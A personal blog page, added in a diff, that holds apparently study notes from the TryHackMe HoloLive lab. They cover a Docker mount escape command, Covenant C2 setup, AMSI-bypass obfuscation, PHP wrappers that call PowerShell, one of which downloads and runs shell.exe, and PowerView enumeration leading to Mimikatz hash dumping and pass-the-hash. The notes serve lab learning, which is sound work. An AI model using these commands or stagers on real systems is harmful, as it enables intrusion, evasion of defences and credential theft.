@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
+<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
+<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>TryHackMe - HoloLive</title>
+ 
+
+  <link rel="stylesheet" type="text/css" href="/assets/main-hacker.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul>
+      <li class="menu-first-child">
+        <span>
+          [cyberRat@RedTeam]~$
+          <span class="blink">
+            █
+          </span>
+        </span>
+      </li>
+      <li>
+        <a href="/">Home</a>
+      </li>
+
+    
+      <li>
+        <a href="/brainbox/">/BrainBox</a>
+      </li> 
+      <li>
+        <a href="/resume/">/Resume</a>
+      </li>
+
+    </ul>
+  </div>
+</header>
+
+<main>
+      <p>###HoloLive lab from THM</p>
+
+<p>Managed Code: code that you develop with a language compiler that targer the runtime</p>
+
+<p>.NET Language → CIL/MSIL → CLR → machine code
+.NET uses a run time environment called Common Language Runtime, Which can be used to run managed code written in C#, Powershell or VB
+Unmanaged code automatically skips the CLR and runs on the Operating system directly</p>
+
+<p>https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview</p>
+
+<p>================================================================================================================
+Enumerate Containers with DeepCE . Deep Container Enumeration
+Less Processes running is usually a pointer of being in a container
+The presece of .dockerenv  in the root directory is also another very good pointer
+reatinh the /proc/1/cgroups would usually show path used by docker which in additional pointer</p>
+
+<p>Securing COntainers
+https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html</p>
+
+<p>Docker SUID
+list available docker images: docker images
+then
+docker run -v /:/mnt –rm -it {image_name:Image_tag} chroot /mnt /bin/bash
+docker run -v /:/mnt –rm -it ubuntu:18.04 chroot /mnt /bin/bash
+================================================================================================================
+C2 CONVENANT
+Further study : https://www.youtube.com/watch?v=oN_0pPI6TYU.</p>
+
+<p>Run Convenent
+sudo dotnet run –project /opt/Covenant/Covenant
+navigate : https://127.0.0.1:7443</p>
+
+<p>LISTENER
+To create a basic listener for this network we only suggest editing the Name, ConnectPort, and ConnectAddresses</p>
+
+<p>LAUNCHER
+There are several options for each launcher, with some launchers having specific options. For this task, we will be focusing on the binary launcher and its options
+To create a basic launcher for this network, we only suggest editing the Listener and ImplantTemplate</p>
+
+<p>Custom C2 Grunt 
+Convenant isnt resource full but enables you to create your own task with c# code in a YAML format</p>
+
+<p>the template follows the follwoing structure
+• Name Name of the task in Covenant UI.
+• Aliases Aliases or shortcuts for the task.
+• Description Description of the task in Covenant UI.
+• Language Language the task source code is written in.
+• CompatibleDotNetVersions Versions of .NET the source code will run on.
+• Code Source code of task.</p>
+
+<p>================================================================================================================
+AMSI Bypasses</p>
+
+<p>usually EDR looks for signature sin bypasses like AmsiScanBuffer, amsiInitFailed, AmsiUtils
+Use AMSI trigger to find what part of the AMSi bypass payload is triggering the error :  https://github.com/RythmStick/AMSITrigger</p>
+
+<p>To use AMSITrigger, we only need to specify two parameters, -u, —url or -i, —inputfile and -f, —format. Find example syntax below.
+Syntax: .\AMSITrigger.exe -u <URL> -f 1 or .\\AMSITrigger.exe -i <file> -f 1</file></URL></p>
+
+<p>The area in red is what triggers the AMSI, so we can edit and obfucate that section using method like 
+ “String Concatenation” : $OBF = ‘Ob’ + ‘fu’ + ‘s’ +’cation’
+Additional methods
+• Concatenate - (‘co’+’ffe’+’e’)
+• Reorder - (‘{1}{0}’-f’ffee’,’co’)
+• Whitespace - ( ‘co’ +’fee’ + ‘e’)</p>
+
+<p>Another payload Obfuscation</p>
+
+<p>Invoke-Obfuscation -ScriptBlock {‘Payload Here’} -Command ‘Token\String\1,2,\Whitespace\1’ -Quiet -NoExit</p>
+
+<p>Run Powershell command with a php file : PHP-Wrapper.php</p>
+
+<p>#Single Command
+&lt;?php
+  function compile_stager() {
+    $init = “powershell.exe”;
+    $payload = “”; // Insert PowerShell payload here
+    $execution_command = “shell_exec”;
+    $query = $execution_command(“$init $payload”);
+    echo $query; // Execute query
+  } </p>
+
+<p>  compile_stager();
+?&gt;</p>
+
+<p>##Double Command 
+&lt;?php
+  function get_stager() {
+    $init = “powershell.exe”;
+    $payload = “Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe”; // Insert PowerShell payload here
+    $execution_command = “shell_exec”;
+    $query = $execution_command(“$init $payload”);
+    echo $query; // Execute query
+  }
+ function execute_stager() {
+  $init = “powershell.exe”;
+    $payload = “.\notashell.exe”; // Insert PowerShell payload here
+    $execution_command = “shell_exec”;
+    $query = $execution_command(“$init $payload”);
+    echo $query; // Execute query
+ }
+  get_stager();
+  execute_stager();
+  die();
+?&gt;</p>
+
+<p>================================================================================================================
+Enumerate for Applocker policy</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Get-AppLockerPolicy -Effective</td>
+      <td>select -ExpandProperty RuleCollections</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>we can use applocker checker to determin location and directories from which we can run certai programs
+https://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1.</p>
+
+<p>================================================================================================================
+Enumerating for EDR and AntiViruses</p>
+
+<p>We can use Seatbelt and SharpEDRChecker</p>
+
+<p>./Seatbelt.exe <ModuleName>
+Examples
+./Seatbelt.exe CredEnum
+./Seatbelt.exe ScheduledTasks
+./Seatbelt -group=full
+For more info
+https://github.com/GhostPack/Seatbelt#command-groups</ModuleName></p>
+
+<p>================================================================================================================
+POWERVIEW</p>
+
+<p>its great to use poweview to find all the groups available on the AD, then find the group members of those particular groups, then maybe find a PC where one of those member are currently signed in too, if you can local admin on that PC ; go ahead to authenticate to it so as to dump the hashes of the juicy user then PTH</p>
+
+<p>Get-NetLocalGroup
+command will list all groups preset on a local machine/computer</p>
+
+<p>Get-NetLocalGroupMember -GroupName “Administrators”
+command will list all members of the specified group</p>
+
+<p>Get-LoggedOn
+command enumerate logged on users on current local machine/computer</p>
+
+<p>Get-DomainGPO
+enumerate domain policies such as Applocker</p>
+
+<p>Find-LocalAdminAccess
+This command usually check for all the host connected to the domain and checks to see which of those host is our current user/or supplied user a Local admin on</p>
+
+<p>You can use Ps-Remoting to authnticate on the machine</p>
+
+<p>Then  dump hashes with Invoke-MimikatzEx.ps1</p>
+
+<p>================================================================================================================
+Enumerating and Exploiting Schedules tasks</p>
+
+<p>Get-SheduledTask</p>
+
+<p>then filter down to get task that are in the users subdirtectory
+Get-SheduledTask -TaskPath “\Users*”</p>
+
+<p>Read task infomation with
+Get-ScheduledTaskInfo -TaskName “proxy”</p>
+
+<p>================================================================================================================</p>
+
+<p>Switch user using runas</p>
+
+<p>runas /user:ratty  powershell.exe     ! then enmter password when prompted</p>
+
+
+    </main><footer>
+  <a href="https://twitter.com/ratilovich">Twitter</a> 
+</footer>
+</div>
+  </body>
+</html>
